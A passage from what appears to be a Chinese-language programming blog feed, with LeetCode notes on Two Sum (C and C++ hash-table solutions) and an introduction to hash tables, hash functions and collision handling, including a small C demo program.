hashtableSize = numsSize * <span class="number">2</span>; </span><br><span class="line">    twosum* hashtable = (twosum*)<span class="built_in">calloc</span>(hashtableSize, <span class="keyword">sizeof</span>(twosum));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>)); </span><br><span class="line">    <span class="keyword">if</span> (!results) <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// Return NULL if memory allocation fails</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init hash table</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;hashtableSize;i++)&#123;   </span><br><span class="line">        hashtable[i].key=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].value=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].hasData = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// insert key to certain index.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; numsSize; i++)&#123;</span><br><span class="line">        <span class="comment">// only needs to insert the complement number</span></span><br><span class="line">        <span class="type">int</span> complement = target - nums[i]; </span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> index = hash(complement, hashtableSize); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Linear probing for searching empty slot</span></span><br><span class="line">        <span class="keyword">while</span>(hashtable[index].hasData )&#123;</span><br><span class="line">            <span class="comment">// find target</span></span><br><span class="line">            <span class="keyword">if</span> ( hashtable[index].key == complement)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = hashtable[index].value;</span><br><span class="line">                results[<span class="number">1</span>] = i;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">free</span>(hashtable);</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// try to find empty index.</span></span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// insert current number</span></span><br><span class="line">        index = hash(nums[i], hashtableSize); </span><br><span class="line">        <span class="keyword">while</span> (hashtable[index].hasData) &#123;</span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize);</span><br><span class="line">        &#125;</span><br><span class="line">        hashtable[index].key = nums[i]; </span><br><span class="line">        hashtable[index].value = i;</span><br><span class="line">        hashtable[index].hasData = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(hashtable);</span><br><span class="line">    <span class="built_in">free</span>(results);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程式的主要的流程為:</p><ul><li>定義 hashtable 結構以及 hashtable 大小</li><li>定義 hash function</li><li>初始化回傳陣列</li><li>初始化 hashtable</li><li>插入元素，需要先判斷 index 內是否已經有元素存在<ul><li>發生碰撞時，透過 Linear Probing 來處理碰撞，找到空位址</li><li>若無元素存在則直接插入元素</li></ul></li><li>釋放記憶體，返回回傳陣列</li></ul><p>這種作法又被稱為 <strong>Two-pass Hash Table</strong>，主要原因是他經過兩次迭代，一次將元素的值和索引填到 hashtable的 key跟value，另一次檢查每個元素的 complement 是否存在於 hash table 當中。</p><p>這樣透過雜湊表的執行時間複雜度可以降到 $O(n)$，其實查找Hash Table的時間複雜度會是 $O(1)$，但考量到碰撞可能發生，進行 Linear Probing，這會讓整體的時間複雜度變成 $O(n)$。</p><p><img src="/img/LeetCode/Two_Sum/two_sum_result.png"></p><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>原本在實作的時候，我原本的 hashtable 結構只有定義</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">    &#125; twosum;</span><br></pre></td></tr></table></figure><p>並且在判斷式是使用 <code>while( hashtable[index].key != 0 || hashtable[index].value != 0 )</code></p><p>但後面發現對特定的測資會出現問題，像是 <code>nums = [0,4,3,0]</code> 並且 <code>target= 0</code>的時候，並不會有任何輸出出現</p><h2 id="問題分析"><a href="#問題分析" class="headerlink" title="問題分析"></a>問題分析</h2><p>原因是在插入hash table 的時候，以第一個元素為例，插入至hashtable的key會是 0，<strong>但我們在初始化將沒有資料的狀況定義成0，並且在中間判斷式也以0作為有無值的判斷依據</strong>，但在想要出儲存的值本身為 0 時，這樣會發生衝突，因此後續解法就是在 hashtable 的結構中定義一個 <code>hasData</code> 來判斷是否有資料存在。</p><p>但這麼做也有缺點，那就是增加了空間複雜度。</p><h1 id="其他解法-One-Pass-Hash"><a href="#其他解法-One-Pass-Hash" class="headerlink" title="其他解法 - One Pass Hash"></a>其他解法 - One Pass Hash</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hashTable</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        UT_hash_handle hh;</span><br><span class="line">    &#125; *hashTable = <span class="literal">NULL</span>, *item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;</span><br><span class="line">        <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">        HASH_FIND_INT(hashTable, &amp;complement, item);</span><br><span class="line">        <span class="keyword">if</span> (item) &#123;</span><br><span class="line">            <span class="type">int</span>* result = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">2</span>);</span><br><span class="line">            result[<span class="number">0</span>] = item-&gt;value;</span><br><span class="line">            result[<span class="number">1</span>] = i;</span><br><span class="line">            *returnSize = <span class="number">2</span>;</span><br><span class="line">            HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        item = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> hashTable));</span><br><span class="line">        item-&gt;key = nums[i];</span><br><span class="line">        item-&gt;value = i;</span><br><span class="line">        HASH_ADD_INT(hashTable, key, item);</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡就是將插入 hashtable 和檢查 complement 併入同一個迭代中，但由於還是迭代了 n 個元素，因此時間複雜度一樣是 $O(n)$</p><blockquote><p>這裡我也開始考慮改成學習使用 C++ 來刷題XD，C++ 像這種題目就有很多好用的 STL  <code>unordered_map</code> 能夠直接使用，不需要重新設計太多東西。</p></blockquote><h1 id="C-的解法"><a href="#C-的解法" class="headerlink" title="C++ 的解法"></a>C++ 的解法</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            hash[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (hash.<span class="built_in">find</span>(complement) != hash.<span class="built_in">end</span>() &amp;&amp; hash[complement] != i) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i, hash[complement]&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
            <tag> Hash Table </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必備神器 | 雜湊表 (Hash Table) | LeetCode 筆記</title>
      <link href="/posts/ef71152b.html"/>
      <url>/posts/ef71152b.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h1><p>雜湊表是一種 Key Value Mapping 的結構，可以用快速查找資料，相較於一般搜尋演算法的時間複查度 $O(Log n)$ 他時間複雜度會是 $O(1)$</p><p>主要神速的原因是因為 Hash Function，如果先把 n 個數字儲存在 Hash Table 裡面，那如果要判斷這個數字 A 是不是已經被存在 Hash Table 裡面，只要先把這個數字丟進 hash function，就可以直接知道 A 對應到 Hash Table 中哪一格。</p><h3 id="Hash-Table-不適合使用的時機"><a href="#Hash-Table-不適合使用的時機" class="headerlink" title="Hash Table 不適合使用的時機"></a>Hash Table 不適合使用的時機</h3><ul><li>資料有處理上的時間優先順序，這種比較適合 Queue (FIFO)的結構</li><li><strong>如果資料想要被排序，那也不適合用 Hash Table</strong><ul><li><a href="https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/">https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/</a></li></ul></li></ul><h3 id="Hash-Table-適合的使用條件"><a href="#Hash-Table-適合的使用條件" class="headerlink" title="Hash Table 適合的使用條件"></a>Hash Table 適合的使用條件</h3><ul><li>題目要求使用時間複雜度 $O(1)$  的演算法來存取元素</li><li>最糟的狀況也有 $O(n)$ 時間複雜度</li></ul><h1 id="Hash-Function"><a href="#Hash-Function" class="headerlink" title="Hash Function"></a>Hash Function</h1><p>一個 hash function 要成立會有三中條件</p><ol><li>hash function 計算出來的值是非負整數</li><li>如果 key1 &#x3D; key2 ，則 <code>hash (key1) = hash (key2)</code></li><li>如果 key1 ≠ key2 ，則 <code>hash (key1) ≠ hash (key2)</code></li></ol><p>需要要注意的點是，在多筆資料放在同個空間容易發生<strong>碰撞(collision)<strong>，</strong>load factor</strong> 就是用來衡量碰撞發生的因子<br>    - $load factor &#x3D; n &#x2F; m$<br>    - $n$  &#x3D;  輸入資料個數<br>    - $m$ &#x3D;  雜湊表的大小<br>    - 如果 $load factor &gt; 1$ 則很可能發生碰撞<br>        - <a href="https://zh.wikipedia.org/wiki/%E9%B4%BF%E5%B7%A2%E5%8E%9F%E7%90%86">https://zh.wikipedia.org/wiki/鴿巢原理</a><br>        - 白話文解釋就是如果 n &gt; m 那必定有資料要跟別的資料住在同個桶子裡</p><h2 id="Hash-Function-的實作方式-（除法-儲存方式用陣列）"><a href="#Hash-Function-的實作方式-（除法-儲存方式用陣列）" class="headerlink" title="Hash Function 的實作方式 （除法, 儲存方式用陣列）"></a>Hash Function 的實作方式 （除法, 儲存方式用陣列）</h2><p>首先可以定義每筆資料在雜湊表中的索引值 (index)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = key % m        <span class="comment">// 0 &lt;= index &lt; m </span></span><br></pre></td></tr></table></figure><p>範例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A ( Key = 11324)</span><br><span class="line"></span><br><span class="line">B ( Key = 6356)</span><br><span class="line"></span><br><span class="line">C ( Key = 345)</span><br><span class="line"></span><br><span class="line">D ( key = 4171 )</span><br></pre></td></tr></table></figure><p>M (雜湊表大小)&#x3D; 6, 則雜湊表的 index 會如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Index of A :  11324 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of B:   6356 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of C:  345 % 6 = 3</span><br><span class="line"></span><br><span class="line">Index of D: 4171 % 6 =1</span><br></pre></td></tr></table></figure><p>可以發現到 A 與 B 發生碰撞，這會與 m  的選擇有關，m 的選擇要盡可能元離 $2^p$  越遠越好</p><p><img src="/img/LeetCode/HashTable/hashtable.drawio.png"></p><h3 id="Hash-Function的實作-（乘法-儲存方式用陣列）"><a href="#Hash-Function的實作-（乘法-儲存方式用陣列）" class="headerlink" title="Hash Function的實作 （乘法, 儲存方式用陣列）"></a>Hash Function的實作 （乘法, 儲存方式用陣列）</h3><p>$index &#x3D; [ m \cdot ((key \cdot A) \mod 1) ]$</p><p>$0 ≤  index &lt; (m-1)$</p><p>步驟：</p><ul><li>Key 乘上一個小於 1 的無理數，即 Ａ， A 通常會選擇  $\frac{\sqrt5 -1}{2}$  ，乘完後會得到一個更大的無理數</li><li>將這個無理數去跟 1 取餘數，這麼做也會將無理數的整數部分去除，僅剩下小數</li><li>m 乘上小數，這一步會得到一個 $0$ 與 ($m-1)$ 之間 的 無理數</li><li>透過高斯符號對無理數去取整數<ul><li><a href="https://zh.wikipedia.org/wiki/%E5%8F%96%E6%95%B4%E5%87%BD%E6%95%B0">https://zh.wikipedia.org/wiki/取整函数</a></li></ul></li></ul><blockquote><p>下面的圖講解得挺好<br>圖來源: <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a></p></blockquote><p><img src="/img/LeetCode/HashTable/hashfunction.png"></p><p>這麼繁瑣求 index 的方法有什麼優點：</p><ul><li>沒有 m 要遠離 $2^p$ 的限制</li><li>可以提高隨機性</li></ul><h1 id="如何處理尋址衝突？"><a href="#如何處理尋址衝突？" class="headerlink" title="如何處理尋址衝突？"></a>如何處理尋址衝突？</h1><h2 id="1-Seperate-Chaining-x2F-Close-Addressing"><a href="#1-Seperate-Chaining-x2F-Close-Addressing" class="headerlink" title="1.  Seperate Chaining &#x2F; Close Addressing"></a>1.  Seperate Chaining &#x2F; Close Addressing</h2><p>在每個儲存空間中再生成新的鏈狀儲存空間，可以用 Linked List 或者是 Array 來實現</p><p><img src="/img/LeetCode/HashTable/hashtable-linkedlist.png"></p><p>由於需要額外的指標，如果存儲的資料大小小於一個指標，那麼使用鏈結串列會消耗雙倍的記憶體來存儲資料。然而，如果要存儲的資料遠大於一個指標的大小，指標的額外消耗就可以忽略不計了。事實上，我們可以對鏈結串列進行改造，讓其後端結合紅黑樹、跳表等資料結構，這樣最終 Hash Table 的查找時間只需要 $O(log n)$</p><p>這種結構適合存儲大量資料且每筆資料較大的情況，而且它還支持更多樣的優化策略，可以結合紅黑樹等一起使用。</p><h2 id="2-Open-Addressing"><a href="#2-Open-Addressing" class="headerlink" title="2. Open Addressing"></a>2. Open Addressing</h2><p>Open Addressing 主要透過 <strong>probing</strong> 的方式來尋找未儲存資料的空間，可以分成：</p><ul><li>Linear Probing</li><li>Quadratic probing</li></ul><h3 id="Linear-Probing"><a href="#Linear-Probing" class="headerlink" title="Linear Probing"></a>Linear Probing</h3><p>遇到衝突時，檢查下一個索引位置是否空閒，如果是空的就放入資料，如果不是就繼續往下找。當要尋找元素時，如果遇到衝突，也需要向後搜尋，直到找到一個空的位置才停止搜尋。</p><p><strong>缺點</strong>：Hash Table 支援刪除操作，但被刪除的元素需要標記，否則直接刪除會導致後續的搜尋過程被中斷。</p><h3 id="Quadratic-probing"><a href="#Quadratic-probing" class="headerlink" title="Quadratic probing"></a>Quadratic probing</h3><p>可以用來解決 Linear Probing 效率低，Linear Probing 在插入元素多的時候，在尋址時也會效率緩慢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+<span class="number">1</span>, hash(key)+<span class="number">2</span>, hash(key)+<span class="number">3</span>,…..hash(key)+n</span><br></pre></td></tr></table></figure><p>所以在 Quadratic probing 的時候將尋址方式改成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+ <span class="number">1</span>^<span class="number">2</span> , hash(key)+ <span class="number">2</span>^<span class="number">2</span>, hash(key)+<span class="number">3</span>^<span class="number">2</span></span><br></pre></td></tr></table></figure><p>每次都增加 <code>n^2</code> 來找空位址</p><h3 id="Double-hashing"><a href="#Double-hashing" class="headerlink" title="Double hashing"></a>Double hashing</h3><p>另外，若有衝突發生，也可以直接再跑另一個 Hash Function，也就是當衝突發生時，<strong>持續進行hash 直到衝突結束</strong></p><p>$index_{n} &#x3D; F_{1}(k) + (n-1)* F_{2}(k)$ 直到找到最後的 index為止</p><h3 id="開放尋址法的優缺點："><a href="#開放尋址法的優缺點：" class="headerlink" title="開放尋址法的優缺點："></a>開放尋址法的優缺點：</h3><p><strong>優點：</strong></p><p>Open addressing 方法不使用鏈結串列，所有資料都存放在 Array 中，有助於通過快取加快存取速度。</p><p><strong>缺點：</strong></p><p>刪除資料較為麻煩，需要特別標記要刪除的數據。<br>所有資料都存放在同一個 hash table 中，發生衝突的代價較高，因此 load factor 不宜太高，這使得這種方法比較浪費記憶體。</p><h1 id="Hash-Table-實作"><a href="#Hash-Table-實作" class="headerlink" title="Hash Table 實作"></a>Hash Table 實作</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// in order to use bool function in C</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;person; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt=&#123;.name=<span class="string">&quot;Walt&quot;</span>,.age=<span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler=&#123;.name=<span class="string">&quot;Skyler&quot;</span>,.age=<span class="number">27</span>&#125;;</span><br><span class="line">    person Saul=&#123;.name=<span class="string">&quot;Saul&quot;</span>,.age=<span class="number">28</span>&#125;;</span><br><span class="line">    person Mike=&#123;.name=<span class="string">&quot;Mike&quot;</span>,.age=<span class="number">29</span>&#125;;</span><br><span class="line">    person Hank=&#123;.name=<span class="string">&quot;Hank&quot;</span>,.age=<span class="number">30</span>&#125;;</span><br><span class="line">    person Mary=&#123;.name=<span class="string">&quot;Mary&quot;</span>,.age=<span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//add person into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//delete persion in hash table</span></span><br><span class="line">    hash_table_delete(&amp;Walt);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>&#123;</span><br><span class="line">    <span class="type">int</span> length=strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        hash_value+=name[i];</span><br><span class="line">        hash_value=(hash_value*name[i])%TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        <span class="comment">//nothing in the hash table</span></span><br><span class="line">        <span class="keyword">if</span>(hash_table[i]==<span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>,i);</span><br><span class="line">        <span class="comment">//something in the hash table</span></span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>,i,hash_table[i]-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>&#123;</span><br><span class="line">    <span class="comment">//make sure not call this function with null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//insert the person into the index return by hash_function</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line">    <span class="comment">//check the pointer at that index in the table is null or not</span></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//collision, somebody had occupied there already</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if no one occupied there, then occupied the address</span></span><br><span class="line">    hash_table[index]=p;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to avoid null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get index</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        hash_table[index] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span 